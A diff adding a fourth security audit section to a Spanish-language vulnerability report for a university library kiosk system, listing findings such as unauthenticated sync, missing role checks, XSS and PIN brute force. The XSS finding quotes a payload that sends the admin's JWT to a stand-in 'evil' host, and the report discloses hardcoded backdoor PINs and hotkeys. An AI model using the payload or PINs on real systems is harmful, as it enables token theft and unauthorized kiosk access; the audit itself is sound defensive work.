@@ -1,5 +1,11 @@
 ANÁLISIS DE VULNERABILIDADES — Control Biblioteca UNASAM
-Actualizado: 2026-06-03 (análisis exhaustivo verificado contra el código)
+Actualizado: 2026-06-10 (CUARTO análisis exhaustivo multi-agente — categoría G)
+=========================================================
+
+>>> VER AL FINAL: "CATEGORÍA G — CUARTO ANÁLISIS EXHAUSTIVO (2026-06-10)"
+    Auditoría multi-agente de los 4 subsistemas (main.py, endpoints.py, cliente
+    C#, panel web). Hallazgos nuevos verificados G-1..G-20 + corrección de
+    ubicaciones de BUG-1/BUG-5 + estado real de lo arreglado el 2026-06-10.
 =========================================================
 
 Clasificación por urgencia:
@@ -1325,3 +1331,512 @@ PRIORIDAD DE RESOLUCIÓN RECOMENDADA (rápidas y de alto impacto primero):
  11. BUG-6 — enmascarar DNI en consola del panel        (1 línea)
  12. BUG-5 — filtro fecha excluye último segundo        (moderado)
  13. BUG-4 — sesiones huérfanas registran duración 0    (fácil)
+
+
+══════════════════════════════════════════════════════════
+  CATEGORÍA G — CUARTO ANÁLISIS EXHAUSTIVO (2026-06-10)
+══════════════════════════════════════════════════════════
+  Auditoría multi-agente independiente de los 4 subsistemas:
+  server/main.py, server/api/endpoints.py, cliente C# (client/), panel web
+  (admin/). Cada hallazgo se VERIFICÓ leyendo el código real con archivo:línea.
+  No se repite lo ya resuelto. Las correcciones de ubicación de bugs previos
+  están al final de esta categoría.
+
+  RESUMEN DE LO MÁS GRAVE (lo nuevo de este análisis):
+    G-1  [NECESARIO] /api/offline-sync sin auth → inyectar historial/sesiones
+    G-2  [NECESARIO] WS /ws/admin sin identidad de operador ni rol en comandos
+                     destructivos (shutdown, bloqueo global) → admin básico apaga PCs
+    G-3  [NECESARIO] XSS en tabla de Sospechas del panel (sin escapeHtml) →
+                     robo del token JWT de sessionStorage
+    G-4  [NECESARIO] POST /terminales/registrar roto: Terminal(nombre=...) lanza
+    G-5  [NECESARIO] cliente: _verificandoReconexion se atasca → PC no bloqueable
+
+
+  ───────────── SERVIDOR — main.py ─────────────
+
+  ──────────────────────────────────────────────────────────
+  G-1. [NECESARIO] POST /api/offline-sync sin autenticación
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/main.py:1557-1634
+
+  Descripción:
+    El endpoint NO exige auth (docstring lo confirma: "No requiere autenticación
+    de admin — lo llama el kiosco directamente"). Cualquiera en la LAN puede
+    POST {dni, razon, hora_inicio, hora_fin, terminal} arbitrarios. El servidor:
+      - crea la terminal si no existe (1586-1595) → terminales fantasma
+      - registra una Sesion con hora_entrada retroactiva controlada (1599-1616)
+        y confirmada=True
+      - pone terminal.estado="activa" (1617) y notifica a los admins
+  Impacto:
+    - Inyección de historial de uso falso a nombre de un DNI real
+    - Creación de terminales basura; manipulación del estado del panel
+    - Oráculo de existencia de DNI (respuesta not_found vs ok)
+  Cómo arreglar:
+    - Validar contra un secreto compartido del cliente o restringir por IP de
+      terminal conocida; mínimo NO crear terminales aquí y validar formato DNI.
+
+  ──────────────────────────────────────────────────────────
+  G-2. [NECESARIO] WS /ws/admin no conserva identidad ni distingue rol en comandos destructivos
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10) — causa raíz de C-6 en WS
+  Archivo: server/main.py:1337-1345 (auth), 1349-1534 (loop de comandos)
+
+  Descripción:
+    Tras autenticar el WS (1325-1342), el objeto `user` se valida pero SE DESCARTA:
+    solo se hace manager._admins.append(websocket) (1345). El loop de comandos
+    (1349-1534) no tiene referencia al usuario. Consecuencias:
+      1. SIN AUDITORÍA: imposible saber qué admin ejecutó bloquear_todas,
+         remote_command shutdown, desbloquear_terminal.
+      2. SIN ROL: el WS solo exige rol en ("superadmin","admin") al conectar
+         (1337). Un ADMIN BÁSICO puede: apagar cualquier PC (remote_command
+         shutdown ~1481-1498), bloqueo global (bloquear_todas ~1500-1532),
+         desbloquear cualquier PC para cualquier DNI (~1400-1479).
+    Inconsistencia: por HTTP, /api/limpiar-todo exige superadmin; por WS, acciones
+    igual de destructivas las puede hacer un admin básico.
+  Cómo arreglar:
+    - Conservar `user` en el handler; añadir if user.rol != "superadmin" a los
+      comandos destructivos; persistir auditoría con user.username por comando.
+
+  ──────────────────────────────────────────────────────────
+  G-6. [MEDIO] Race condition en ConnectionManager.broadcast (dict mutado en iteración)
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/core/websocket_manager.py:94-102 (broadcast), 119-128 (_broadcast_admins)
+
+  Descripción:
+    broadcast itera `for ip, ws in self.conexiones_activas.items():` sobre el dict
+    VIVO (no list(...)). El loop cede control en cada `await ws.send_json(...)`;
+    si una terminal conecta/desconecta en ese momento (handler en main.py:836/1279),
+    se lanza RuntimeError: dictionary changed size during iteration, abortando el
+    broadcast a medias. broadcast lo usan el scheduler de mensajes (main.py:226,246)
+    y config_backdoor_update (main.py:692). Compárese con bloquear_todas que sí
+    usa list(...).
+  Cómo arreglar:
+    - Iterar sobre list(self.conexiones_activas.items()); considerar asyncio.Lock
+      para mutaciones de _admins/conexiones_activas.
+
+  ──────────────────────────────────────────────────────────
+  G-7. [MEDIO] /api/offline-sync no valida formato DNI ni longitud de razón
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10) — complementa G-1
+  Archivo: server/main.py:1565, 1611 ; modelo _OfflineSyncReq 1549-1554
+
+  Descripción:
+    dni = datos.dni.strip() sin validar 8 dígitos (a diferencia de login_request
+    en 1017). razon se guarda directo y el modelo Pydantic no tiene max_length;
+    razon_uso es String(200) → truncado/error con strings largos.
+  Cómo arreglar:
+    - Validar dni con regla de 8 dígitos; max_length en el modelo Pydantic.
+
+  ──────────────────────────────────────────────────────────
+  G-8. [MEDIO] /api/offline-sync ignora hora_fin: la sesión queda "activa" para siempre
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/main.py:1549-1617
+
+  Descripción:
+    _OfflineSyncReq incluye hora_fin (1549-1554) pero offline_sync NUNCA lo usa.
+    La sesión se crea con estado="activa" (1612) sin hora_salida, y la terminal
+    queda estado="activa" (1617). _limpiar_sesiones_fantasma no la toca (filtra
+    confirmada=0 y ésta es confirmada=True). FUGA DE SESIONES ACTIVAS: sesiones
+    offline ya terminadas aparecen perpetuamente activas en el panel.
+  Cómo arreglar:
+    - Crear la sesión ya cerrada: estado="cerrada", hora_salida=hora_fin,
+      motivo_cierre="offline_sync". O quitar hora_fin del contrato si no aplica.
+
+  ──────────────────────────────────────────────────────────
+  G-9. [MEDIO] Colisión de hostname en actualizar_id desplaza/suplanta terminales
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/main.py:906-907 ; core/websocket_manager.py:27-35
+
+  Descripción:
+    En "hello", terminal_id = hostname (controlado por el cliente, 897) y
+    actualizar_id hace conexiones_activas[new_id]=ws SIN comprobar colisión. Si
+    dos kioscos reportan el mismo hostname (clonación de imagen Windows, común en
+    laboratorios), el segundo hello SOBRESCRIBE la entrada del primero; la conexión
+    del primero queda huérfana. Vector de suplantación: un cliente que conozca el
+    hostname de otra PC "roba" su identidad de control.
+  Impacto:
+    - Comandos bloqueo/desbloqueo/shutdown pueden ir a la PC equivocada.
+  Cómo arreglar:
+    - Detectar colisión de hostname (rechazar/desambiguar) y/o vincular a la IP
+      TCP real ya validada (websocket.client.host).
+
+  ──────────────────────────────────────────────────────────
+  G-10. [BAJO] Errores no controlados / código muerto en main.py
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivos/varios:
+    - main.py:788 — limpiar_todo hace `return {...}, 500`: FastAPI NO interpreta
+      la tupla como status 500; serializa [dict, 500] con status 200. El panel
+      recibe 200 con cuerpo array inesperado. Arreglar con JSONResponse(status_code=500)
+      o raise HTTPException(500).
+    - main.py:1422-1429 — desbloquear_terminal tiene un `if alumno is None`
+      DUPLICADO (1422 y 1427); el segundo es código muerto inalcanzable.
+    - main.py:1646 — descargar-cliente filtra la ruta absoluta del servidor en el
+      detalle del 404 ("Ejecutable no encontrado en {ruta}"). Usar mensaje genérico.
+    - main.py:1534 — el WS admin loguea cualquier `tipo` como "comando: {tipo}"
+      aunque no esté manejado; falta rama else que rechace tipos desconocidos.
+
+
+  ───────────── SERVIDOR — endpoints.py ─────────────
+
+  ──────────────────────────────────────────────────────────
+  G-4. [NECESARIO] POST /terminales/registrar roto: Terminal(nombre=...) lanza TypeError
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/api/endpoints.py:328 ; models.py:67-71
+
+  Descripción:
+    En la rama de creación de terminal nueva: Terminal(nombre=datos.nombre, ...).
+    Pero `nombre` NO es una columna mapeada — es una @property (models.py:68-71);
+    la columna real es nombre_red (nullable=False, unique). SQLAlchemy declarativo
+    no acepta una property como kwarg → TypeError: 'nombre' is an invalid keyword
+    argument for Terminal. La rama de ACTUALIZACIÓN (324) sí funciona (usa el
+    setter terminal.nombre=...). La rama de CREACIÓN falla siempre (500).
+    Mitigado: el cliente C# registra por WebSocket, no por esta ruta REST → es
+    código muerto roto, pero trampa de mantenimiento.
+  Cómo arreglar:
+    - Terminal(nombre_red=datos.nombre, ...) o eliminar el endpoint si es legacy.
+
+  ──────────────────────────────────────────────────────────
+  G-11. [MEDIO] aprobar_sospecha / descartar_sospecha son escritura sin check de rol
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10) — amplía E-5/D-1
+  Archivo: server/api/endpoints.py:766-794 (aprobar), 797-814 (descartar)
+
+  Descripción:
+    Ambas reciben `admin` y lo usan para revisado_por/registrado_por, pero NO
+    verifican admin.rol. Aprobar una sospecha CREA una Incidencia (780-788) a
+    nombre del alumno. No estaban en el inventario de E-5 (que solo listaba
+    lecturas + procesos-ignorados). Un admin básico puede generar incidencias o
+    descartar sospechas.
+  Cómo arreglar:
+    - Decidir el rol; si corresponde, if admin.rol != "superadmin": 403.
+
+  ──────────────────────────────────────────────────────────
+  G-12. [MEDIO] cerrar_todas_sesiones / limpiar_sesiones dejan terminales en estado "disponible"
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/api/endpoints.py:1337 (cerrar_todas), 1368 (limpiar_sesiones)
+
+  Descripción:
+    Ambas hacen update(Terminal).values(estado="disponible"). El resto del sistema
+    usa "bloqueado"/"activo"/"offline". listar_terminales (283) trata cualquier
+    estado != "offline" como visible, así que tras un cierre masivo las PCs quedan
+    "disponibles" — estado que el kiosco no produce. reset_maestro lo hace bien
+    (usa "bloqueado", 1964); estas dos no.
+  Cómo arreglar:
+    - Usar estado="bloqueado" para alinear con el resto (PC esperando login).
+
+  ──────────────────────────────────────────────────────────
+  G-13. [BAJO] Paginación sin tope máximo de `limit` en los listados + exportaciones sin cota
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/api/endpoints.py — sesiones_activas:540, listar_sospechas:737,
+           listar_actividad:833, listar_maestro:1764, historial_bans:2093,
+           listar_personal:2172, listar_incidencias:2423 ; exportar_excel:1012,
+           exportar_pdf:1080
+
+  Descripción:
+    limit: int = N sin cota superior: un cliente autenticado puede pedir
+    ?limit=100000000 y forzar materializar/serializar toda la tabla (DoS
+    amplificable). exportar_excel/exportar_pdf hacen result.all() sin límite ni
+    filtro por defecto (exportar_excel ni siquiera acepta filtro) → con años de
+    historial agota memoria/CPU. Solo exigen login (admin básico puede dispararlo).
+  Cómo arreglar:
+    - limit = min(max(limit,1), 200) o Query(le=200); filtro/tope de filas en exports.
+
+  ──────────────────────────────────────────────────────────
+  G-14. [BAJO] _aplicar_filtro_fecha lanza 500 ante parámetros de fecha malformados
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/api/endpoints.py:481-522 (afecta sesiones_activas y exportar_pdf)
+
+  Descripción:
+    int(anio), int(mes) (482-483, 490, 497) y datetime.strptime(fecha_inicio,...)
+    (520-521) sin try/except. Un cliente que pase ?anio=abc, ?mes=13
+    (calendar.monthrange → IllegalMonthError) o ?fecha_inicio=xx provoca 500 con
+    posible traza (viola B-5/E-12). Contrasta con listar_actividad (857-863) que
+    sí envuelve el parseo.
+  Cómo arreglar:
+    - Validar/parsear con try/except y devolver 422.
+
+  ──────────────────────────────────────────────────────────
+  G-15. [BAJO] TOCTOU en agregar_proceso_ignorado (check-then-insert)
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: server/api/endpoints.py:982-991
+
+  Descripción:
+    SELECT por nombre_exe; si no existe, inserta. nombre_exe es unique (models.py:272).
+    Dos peticiones concurrentes con el mismo exe pasan ambas el SELECT y la segunda
+    commit() lanza IntegrityError no capturado → 500. Riesgo bajo (un admin), pero
+    es TOCTOU genuino (mismo patrón en _get_or_create_facultad/escuela 1655-1685).
+  Cómo arreglar:
+    - Capturar IntegrityError como idempotente, o INSERT ... ON DUPLICATE KEY.
+
+
+  ───────────── CLIENTE C# ─────────────
+
+  ──────────────────────────────────────────────────────────
+  G-5. [NECESARIO] _verificandoReconexion se atasca en true → PC no bloqueable
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: client/Services/OfflineBackdoor.cs:355-363 (NotificarReconexion),
+           117-118 (propiedades), 325-328 (IniciarVerificacion)
+
+  Descripción:
+    IniciarVerificacion() pone _verificandoReconexion=true. Solo se limpia en
+    NotificarReconexion(), PERO ésta hace early-return en "if (_dniActual == null)
+    return;" ANTES de poner el flag en false. Si la sesión offline se cierra por
+    otra vía (timeout de gracia → Bloquear(), o CerrarSesion()) entre
+    IniciarVerificacion y NotificarReconexion, _dniActual ya es null y el flag
+    nunca se limpia.
+  Impacto:
+    - HaySesionActiva / HaySesionOSincronizando devuelven true para siempre →
+      (a) comandos bloquear/forzar_cierre_sesion se ignoran permanentemente
+      (MainWindow ~616-619): LA PC NO SE PUEDE BLOQUEAR REMOTAMENTE;
+      (b) el hello reporta modo_offline=true para siempre.
+  Cómo arreglar:
+    - Mover _verificandoReconexion=false antes del early-return, y resetearlo
+      también en CerrarSesion() y en el path de Bloquear().
+
+  ──────────────────────────────────────────────────────────
+  G-16. [MEDIO] _dniPendiente sucio entre intentos → un alumno hereda el DNI de otro
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10) — flujo offline modificado hoy
+  Archivo: client/Services/OfflineBackdoor.cs:127-176 ; MainWindow.xaml.cs:228-235
+
+  Descripción:
+    SetDatosAlumno guarda _dniPendiente/_razonPendiente cada vez que un alumno
+    pulsa "Ingresar" sin conexión. Solo se limpian al consumirlos en MostrarDialogo
+    (165-166), en LimpiarDatosPendientes (al reconectar) o en el fallback. Escenario
+    sucio: Alumno A ingresa su DNI sin conexión (queda _dniPendiente=A) y se va sin
+    que el encargado meta el PIN. Si luego el encargado pulsa el hotkey directamente
+    (sin que otro alumno use el formulario), MostrarDialogo (146) toma _dniPendiente=A
+    silenciosamente y abre sesión a nombre de A. No hay timeout que invalide un
+    _dniPendiente viejo.
+  Impacto:
+    - Sesión offline registrada con DNI equivocado, o un alumno usa la PC bajo la
+      identidad de otro. Auditoría incorrecta.
+  Cómo arreglar:
+    - Timestamp en SetDatosAlumno; descartar pendientes con > N seg en MostrarDialogo;
+      limpiar también al resetear/perder foco el formulario.
+
+  ──────────────────────────────────────────────────────────
+  G-17. [MEDIO] Validación insuficiente de mensajes del servidor + buffer WS sin reensamblar fragmentos
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: client/UI/MainWindow.xaml.cs:550-695 (ProcesarMensajeServidor),
+           client/Services/WebSocketService.cs:149-167 (recepción)
+
+  Descripción:
+    ProcesarMensajeServidor usa root.GetProperty("tipo") (556) que LANZA si falta;
+    en hello_ack/config_backdoor_update usa GetProperty(...).GetInt32() (664-666)
+    sin TryGetProperty: un mensaje con backdoor_modifiers como string o ausente
+    lanza, y el catch (691) solo loguea → el backdoor puede quedar a medio aplicar.
+    Más grave: el buffer de recepción es FIJO de 4096 bytes (WebSocketService.cs:149,
+    159) y NO acumula fragmentos (result.EndOfMessage se ignora): un mensaje > 4096
+    bytes o fragmentado se trunca → JSON inválido silencioso o parcial.
+  Cómo arreglar:
+    - TryGetProperty + validación de tipo en todos los campos; acumular fragmentos
+      hasta EndOfMessage antes de parsear; descartar mensajes que no parseen.
+
+  ──────────────────────────────────────────────────────────
+  G-18. [MEDIO] WebSocket cliente: SendAsync concurrentes + fugas de recursos
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: client/Services/WebSocketService.cs:70-79 (loops), 132-140 (Desconectar);
+           client/UI/MainWindow.xaml.cs:511-515, 795-801 (VentanaDesconexion)
+
+  Descripción:
+    1. HeartbeatLoopAsync hace SendAsync cada 3s concurrentemente con cualquier
+       EnviarAsync (login, actividad). ClientWebSocket NO permite dos SendAsync
+       simultáneos → InvalidOperationException intermitente; el heartbeat cae y
+       genera reportes de error falsos. Serializar con SemaphoreSlim(1,1).
+    2. VentanaDesconexion se descarta con Cancelar() (Stop+Hide) pero NUNCA Close():
+       la ventana WPF queda viva oculta; en sesiones largas con muchas desconexiones
+       se acumulan ventanas/timers. Llamar Close() y desuscribir TiempoAgotado.
+    3. Desconectar() hace _cts.Cancel() sin recrear el CTS → reconexión imposible
+       tras cancelar (terminal por diseño hoy, pero es trampa de reuso).
+    4. _activityMonitor nunca se Dispose() en OnClosed (FileSystemWatcher + CTS).
+
+  ──────────────────────────────────────────────────────────
+  G-19. [MEDIO] PIN del backdoor sin rate limiting (fuerza bruta) + DNI en claro en logs locales
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10) — junto a E-4 al recompilar
+  Archivo: client/Services/OfflineBackdoor.cs:178-240, 402 ; App.xaml.cs:25-30 ;
+           MantenimientoBackdoor.cs:125-139
+
+  Descripción:
+    1. ValidarPinPersonal no tiene límite de intentos (el PasswordBox permite
+       reintentos infinitos). Igual en MantenimientoBackdoor. Con PINs cortos
+       hardcodeados ("UNASAM" 6 letras, "UNASAM2025"), fuerza bruta sin penalización
+       por quien tenga acceso físico.
+    2. GuardarLogLocal escribe DNI+razon+terminal en claro en offline_sessions.json
+       junto al exe; App.AppLog escribe DNI completo en C:\SistemaBiblioteca\crash.log.
+       El servidor enmascara PII (B-8); el cliente NO. PII en disco de cada PC en
+       texto plano.
+  Cómo arreglar:
+    - Contador de intentos con bloqueo temporal tras N fallos; enmascarar DNI en
+      logs locales (****6514) o restringir ACL del directorio.
+
+  NOTA: la corrección de E-4 (Ctrl+Alt+F12 en el doc) es en realidad Ctrl+Alt+F7
+    (KioscoConfig.cs:16 BackdoorKey=0x76). El backdoor offline usa Ctrl+Alt+F11
+    (OfflineKey=0x7A) con OfflinePin="UNASAM". Corregir esa referencia en E-4.
+
+  ──────────────────────────────────────────────────────────
+  G-20. [BAJO] Cliente: código muerto + ventana de update interrumpido deja PC sin kiosco
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: client/UI/MainWindow.xaml.cs:43-50, 282-299 ; AutoUpdater.cs:141-176
+
+  Descripción:
+    1. _codigosPrueba (códigos "2021001"... con nombres) y ValidarOffline son código
+       muerto: nada los llama (la validación offline real va por OfflineBackdoor).
+       Embebe datos de prueba en el binario de producción. Eliminar.
+    2. AutoUpdater hace File.Move(exe→.bak) y luego File.Move(nuevo→exe). Si el
+       proceso muere entre ambas (corte de luz), la PC arranca SIN kiosco (el .bat
+       apunta a un exe que no existe). RollbackSiNecesario solo corre en el catch
+       del mismo proceso, no ante crash duro. Usar File.Replace (atómico) o
+       verificar al arranque y restaurar .bak si falta el exe.
+
+
+  ───────────── PANEL WEB — admin/ ─────────────
+
+  ──────────────────────────────────────────────────────────
+  G-3. [NECESARIO] XSS por innerHTML sin escapar en la tabla de Sospechas → robo del token
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10)
+  Archivo: admin/static/js/app.js:3478-3517 (_renderSospechas)
+
+  Descripción:
+    A diferencia del resto del panel (que usa escapeHtml), aquí los datos se
+    interpolan CRUDOS: ${s.nombre_alumno} (3504), ${s.dni} (3505), ${s.detalle}
+    (3510), ${s.estado} (3513), y en handlers inline actVerDesdeSospecha('${pcSosp}',
+    '${s.dni}',...) (3486, 3500). nombre_alumno/detalle/dni vienen de la detección de
+    sospechas, alimentada por datos del WS de terminal (sin auth fuerte — E-1/E-13).
+    El saneo de E-13 cubre proceso_exe/tipo_ev, NO el detalle/nombre que arman la
+    sospecha.
+  Impacto:
+    - Un atacante en la LAN que inyecte
+      <img src=x onerror="fetch('//evil/'+sessionStorage.panel_token)"> como detalle/
+      nombre de una sospecha → se ejecuta en el navegador del admin al abrir la
+      pestaña Sospechas → ROBO DEL TOKEN JWT (ahora en sessionStorage) y acciones
+      admin. Es el único render del panel que rompe la convención de escape.
+  Cómo arreglar:
+    - Envolver con escapeHtml() todos los campos; en onclick, escapar/codificar
+      para contexto JS o migrar a addEventListener con dataset.
+
+  ──────────────────────────────────────────────────────────
+  G-21. [BAJO] confirm() nativo inconsistente + eliminarMensaje sin confirmación
+  ──────────────────────────────────────────────────────────
+  ESTADO: PENDIENTE (nuevo — verificado 2026-06-10) — coincide con MEJORA-17
+  Archivo: admin/static/js/app.js:3524 (accionSospecha), 3721 (ignorarProceso),
+           3772 (quitarProcesoIgnorado), 4138 (eliminarTerminalFantasma),
+           4156 (eliminarMensaje — SIN confirmación)
+
+  Descripción:
+    El panel tiene modal propio (mostrarConfirmacion) pero 4 sitios usan confirm()
+    nativo (suprimible por el navegador → acción destructiva sin confirmar) y
+    eliminarMensaje borra directo sin preguntar.
+  Cómo arreglar:
+    - Migrar esos confirm() a mostrarConfirmacion; añadir confirmación a eliminarMensaje.
+
+
+  ══════════════════════════════════════════════════════════
+  ESTADO REAL DE LO ARREGLADO EL 2026-06-10 (sesión de mejoras)
+  ══════════════════════════════════════════════════════════
+  Verificado contra el código tras la sesión de casos de uso:
+
+  BUG-8 (innerHTML → textContent en _aplicarConfigApp):
+    PARCIAL. Los TEXTOS (título/subtítulo/footer del login) YA usan textContent
+    (app.js:3297-3299) — RESUELTO. Pero el LOGO agregado ese día usa innerHTML con
+    src="${logo}" interpolado (app.js:3274, 3290). El logo viene de
+    FileReader.readAsDataURL (siempre data:image/...), riesgo bajo, pero es un sink.
+    Mejor: crear <img> con createElement y asignar img.src, o validar
+    logo.startsWith('data:image/'). El favicon ya se asigna con .href (seguro, 3285).
+
+  F-2 backup (mysqldump):
+    El problema documentado en docs/CASOS_DE_USO.txt (backup sin datos) se corrigió:
+    se quitó --set-gtid-purged=OFF y se añadieron --no-tablespaces, --complete-insert,
+    --extended-insert, --add-drop-table, --disable-keys, --hex-blob, más verificación
+    post-dump de que el .sql contiene INSERT INTO (endpoints.py:647-728). CORRECTO.
+
+  /auth/me (nuevo, persistencia de sesión):
+    SIN PROBLEMAS. Exige Depends(obtener_usuario_actual), solo devuelve username/rol/
+    nombre_completo del propio token; no acepta parámetros, sin IDOR (endpoints.py:128-138).
+
+  Persistencia de sesión en sessionStorage (F5):
+    ACEPTABLE. El token se valida contra /auth/me al restaurar (no se confía
+    localmente). sessionStorage se borra al cerrar pestaña (mejor que localStorage en
+    PC compartida). RIESGO: cualquier token en JS storage es robable por XSS — por eso
+    G-3 (XSS en Sospechas) es prioritario: cierra el vector que permitiría exfiltrarlo.
+    panel_tab y la clase anti-flash con-sesion: verificados seguros (no llegan a innerHTML).
+
+  BUG-3 (validación password panel 6 chars):
+    NO corregido en el frontend (app.js:3229-3232 sigue en length<6). El backend exige
+    8+mayúscula+número y rechaza igual (no es agujero), pero el feedback del panel es
+    incorrecto. Pendiente menor.
+
+  BUG-6 (DNI en claro en consola del panel cada 15s):
+    NO corregido (app.js:1674-1678 en renderSesiones, invocado por el setInterval de
+    15s). La consola es exportable a .txt → PII persistida. Contradice B-8. Pendiente.
+
+
+  ══════════════════════════════════════════════════════════
+  CORRECCIONES DE UBICACIÓN DE BUGS PREVIOS (verificado 2026-06-10)
+  ══════════════════════════════════════════════════════════
+  BUG-1: la línea real de datetime.utcnow() en cerrar_todas_sesiones es
+         endpoints.py:1330 (el doc decía 1275). SIGUE PENDIENTE.
+  BUG-2: actualizar_maestro en endpoints.py:1877-1918. Además de no asignar
+         id_facultad (línea 1916 solo pone id_escuela), AGRAVADO: si se edita solo
+         la facultad sin escuela, id_esc queda None y la línea 1916 BORRA la escuela
+         existente del alumno. SIGUE PENDIENTE.
+  BUG-5: la ubicación real NO es _aplicar_filtro_fecha (que opera sobre Sesion.fecha_uso,
+         columna DATE, y está bien). El bug está en listar_actividad endpoints.py:861
+         (ActividadLog.fecha_hora < datetime(d,...,23,59,59) sobre columna DATETIME).
+         SIGUE PENDIENTE. Corregir la referencia del doc.
+  F-3 (GET/PUT /api/config/backdoor sin rol): YA RESUELTO — main.py:658 (GET) y 680
+         (PUT) verifican superadmin. Marcar F-3 como resuelta.
+
+
+  ══════════════════════════════════════════════════════════
+  RESUMEN EJECUTIVO — CATEGORÍA G (2026-06-10)
+  ══════════════════════════════════════════════════════════
+  NUEVOS HALLAZGOS VERIFICADOS: 21 (G-1..G-21)
+    NECESARIO (5): G-1 offline-sync sin auth, G-2 WS admin sin rol/identidad,
+                   G-3 XSS Sospechas, G-4 registrar_terminal roto, G-5 flag
+                   _verificandoReconexion atascado.
+    MEDIO (10): G-6 race broadcast, G-7/G-8 offline-sync (validación/hora_fin),
+                G-9 colisión hostname, G-11 sospechas sin rol, G-12 estado
+                "disponible", G-16 _dniPendiente sucio, G-17 validación WS cliente,
+                G-18 SendAsync/fugas, G-19 PIN sin rate-limit/PII local.
+    BAJO (6): G-10 errores main.py, G-13 paginación sin tope, G-14 fecha→500,
+              G-15 TOCTOU, G-20 código muerto/update, G-21 confirm() inconsistente.
+
+  CAMBIOS DE ESTADO:
+    F-3 → RESUELTA (check superadmin presente).
+    BUG-8 → PARCIAL (textos resueltos; logo aún por innerHTML).
+    F-2 backup → corregido en la sesión del 2026-06-10.
+
+  PRIORIDAD RECOMENDADA (rápidas y de alto impacto, SIN recompilar cliente):
+    1. G-3  — escapar campos en _renderSospechas (XSS → robo token)   [app.js]
+    2. G-1  — autenticar/validar /api/offline-sync                    [main.py]
+    3. G-2  — conservar identidad + rol en comandos WS destructivos   [main.py]
+    4. G-4  — Terminal(nombre=) → Terminal(nombre_red=)               [endpoints.py]
+    5. G-12 — estado "disponible" → "bloqueado" en cierres masivos    [endpoints.py]
+    6. G-6  — list(...) en broadcast (evitar RuntimeError)            [websocket_manager.py]
+    7. G-11 — rol en aprobar/descartar sospecha (si aplica)           [endpoints.py]
+    8. G-13 — tope de limit en listados                              [endpoints.py]
+
+  REQUIEREN RECOMPILAR EL CLIENTE C# (coordinar con despliegue, junto a E-2/E-3/E-4):
+    G-5 (flag atascado — el más grave del cliente), G-16 (_dniPendiente),
+    G-17 (validación WS), G-18 (SendAsync/fugas), G-19 (rate-limit PIN/PII),
+    G-20 (update atómico).
+
+  NOTA: G-5 es crítico porque puede dejar una PC imposible de bloquear remotamente.
+  Abordarlo en la próxima recompilación junto con el flujo offline modificado hoy.
